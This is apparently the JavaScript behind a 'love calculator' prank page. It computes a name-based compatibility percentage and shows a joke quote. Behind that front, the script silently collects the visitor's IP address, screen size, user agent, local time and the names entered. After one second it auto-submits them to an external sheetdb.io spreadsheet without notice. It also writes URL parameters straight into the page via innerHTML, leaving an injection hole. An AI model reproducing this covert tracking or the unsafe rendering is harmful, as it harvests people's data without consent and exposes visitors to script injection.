let quotes, compatibility,personName,crushName,DeviceOwner,quote
        
        
        
// Get the URL parameters
const queryString = window.location.search;

// Create a new URLSearchParams object
const urlParams = new URLSearchParams(queryString);

// Get the crush_name parameter
 crushName = urlParams.get('crush_name');
  personName = urlParams.get('person_name');
// Update the content of the HTML elements
document.getElementById("person").innerHTML =  personName;
document.getElementById("crush").innerHTML = crushName;

//percentage creation
// Define a function to calculate the numerological value of a name
function getNumerologyValue(name) {
    let sum = 0;
    for (let i = 0; i < name.length; i++) {
    let charCode = name.charCodeAt(i) - 96; // convert letter to numerical value (a = 1, b = 2, etc.)
    if (charCode > 0 && charCode < 27) {
        sum += charCode;
    }
    }
    return sum;
}

// Prompt the user for two names
let name1 = personName
let name2 = crushName

// Calculate the numerology values of the names
let value1 = getNumerologyValue(name1.toLowerCase());
let value2 = getNumerologyValue(name2.toLowerCase());

// Calculate the love compatibility as a percentage
compatibility = Math.round((Math.min(value1, value2) / Math.max(value1, value2)) * 100);
console.log(compatibility)
function updatePercentage() {
            let part=compatibility
            const percentage = (part/100) * 276;
            const circle = document.querySelector('.circular-chart .circle');
            circle.style.setProperty('--percentage', `${percentage}%`);
        }
        
       
document.getElementById("percentage").innerHTML = compatibility + '%'
updatePercentage()

// code for determining quotes

if(compatibility>=0 && compatibility<= 9)
quotes = "Being single is like tissue paper after finish we buy new box  from store";

else if(compatibility>= 10 && compatibility<= 19)
quotes = "Being single means  you're not contributing to overpopulation. So, you're basically a hero."

    else if(compatibility>= 20 && compatibility<= 29)
    quotes = "you know why you did't get a right person ,Because your person is hit by a Truck"

    else if(compatibility>= 30 && compatibility<= 39)
    quotes = "you will become millionaire because you don't have to speed money on valentines day"

    else if(compatibility>= 40 && compatibility<= 49)
    quotes = "Being single is like going to a buffet and finding out they're all out of food."

    else if(compatibility>= 50 && compatibility<= 59)
    quotes = "Don't get doubt you never get committed"

    else if(compatibility>= 60 && compatibility<= 69)
    quotes = "Being in a committed relationship is like a science experiment.Sometimes it's a total disaster."

    else if(compatibility>= 70 && compatibility<= 79)
    quotes = "I think your Life is like a Romatic comedy theres No Romance and it just you laughing at your Own Jokes."

    else if(compatibility>= 80 && compatibility<= 89)
    quotes = "Being committed is like being in a horror movie, you're stuck in a bad situation and can't escape"

    else if(compatibility>= 90 && compatibility<= 99)
    quotes = "Don't get too excited, because it's like choosing the first slice of pizza before you've seen all the different varieties of pizza."

else
quotes = "Don't get too excited, because it's like signing up for a subscription you can't cancel."

quote= quotes 
document.getElementById("quotes").innerHTML =quotes 

console.log(navigator.userAgent);


// adding the data
function setIPAddress() { // find ip address
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
      document.getElementById("ip-address").value = data.ip;
      
      console.log(data.ip)
      return data.ip
    })
    .catch(error => {
      console.error('Error retrieving IP address:', error);
    });
    
}
//function setScreenSize(){ // find screen size
    var screenWidth = window.screen.width;
      var screenHeight = window.screen.height;
    let screensize = screenWidth + 'x'+screenHeight;
    console.log(screensize);
    document.getElementById("screen-size").value = screensize;
//}

    

//function setDateTime() {
var options = { timeZone: 'Asia/Kolkata', weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric' };
let DateTime = new Date().toLocaleString('en-IN', options);

//}
 



document.getElementById("Date-Time").value = DateTime;//setDateTime()
document.getElementById("ip-address").value = setIPAddress();
document.getElementById("screen-size").value = screensize;
document.getElementById("user-agent").value = navigator.userAgent;//setUserAgent();
document.getElementById("person-name").value =urlParams.get('person_name');
document.getElementById("crush-name").value =  urlParams.get('crush_name');
let pervalue=(Math.round((Math.min(value1, value2) / Math.max(value1, value2)) * 100)) + '%'
console.log(pervalue)
document.getElementById("percentagetext").value =  pervalue
document.getElementById("quote").value = quote



const form = document.querySelector('#sheetdb-form');

form.addEventListener('submit', function(event) {
event.preventDefault();

var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://sheetdb.io/api/v1/rula7np12ohhn');
xhr.send(new FormData(form));
});




// Submit the form
setTimeout(function() {
  document.getElementById("submit-btn").click();
}, 1000);

form.addEventListener("click", e => {
e.preventDefault();
fetch(form.action, {
  method : "POST",
  body: new FormData(document.getElementById("sheetdb-form")),
}).then(
  response => response.json()
).then((html) => {

});
});





